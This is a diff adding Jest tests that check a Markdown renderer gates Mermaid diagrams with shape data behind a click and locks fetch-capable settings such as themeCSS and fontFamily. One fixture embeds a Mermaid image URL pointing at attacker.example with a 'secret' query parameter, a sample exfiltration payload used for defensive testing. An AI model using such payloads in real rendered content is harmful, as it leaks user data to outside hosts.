@@ -109,6 +109,54 @@ afterEach(() => {
 });
 
 describe("Mermaid and SVG fences", () => {
+  // Shape data is requested as the node is drawn, whatever the settings say,
+  // so a block that holds it draws on a click and shows its source until then.
+  test("a Mermaid fence with shape data waits for a click", async () => {
+    const text =
+      '```mermaid\nflowchart LR\n  A@{ img: "https://attacker.example/x.png?d=secret" }\n```';
+    render(<Markdown text={text} />);
+    const gate = await screen.findByTestId("md-figure-draw");
+    expect(mermaid.render).not.toHaveBeenCalled();
+    expect(mermaid.parse).not.toHaveBeenCalled();
+    expect(screen.queryByTestId("md-figure-pending")).toBeNull();
+    fireEvent.click(gate);
+    await screen.findByTestId("md-figure-img");
+    expect(mermaid.render).toHaveBeenCalledTimes(1);
+    expect(screen.queryByTestId("md-figure-draw")).toBeNull();
+  });
+
+  test("the documentation draws its own diagrams at once", async () => {
+    render(
+      <Markdown
+        text={"```mermaid\nflowchart LR\n  A@{ shape: rect }\n```"}
+        remoteMedia="load"
+      />,
+    );
+    await screen.findByTestId("md-figure-img");
+    expect(screen.queryByTestId("md-figure-draw")).toBeNull();
+  });
+
+  // A font, a theme or a stylesheet can name an address the browser fetches
+  // while the picture is put together, and HTML labels can hold an <img>.
+  test("a directive in a reply cannot set what can fetch", async () => {
+    render(<Markdown text={"```mermaid\nflowchart LR\n  A-->B\n```"} />);
+    await screen.findByTestId("md-figure-img");
+    const { secure } = mermaid.initialize.mock.calls[0]![0] as {
+      secure: string[];
+    };
+    for (const key of [
+      "securityLevel",
+      "themeCSS",
+      "fontFamily",
+      "altFontFamily",
+      "themeVariables",
+      "theme",
+      "htmlLabels",
+    ]) {
+      expect(secure).toContain(key);
+    }
+  });
+
   test("draws a Mermaid fence as a picture by default", async () => {
     render(<Markdown text={fence("mermaid", FLOW)} />);
     const img = await screen.findByTestId("md-figure-img");
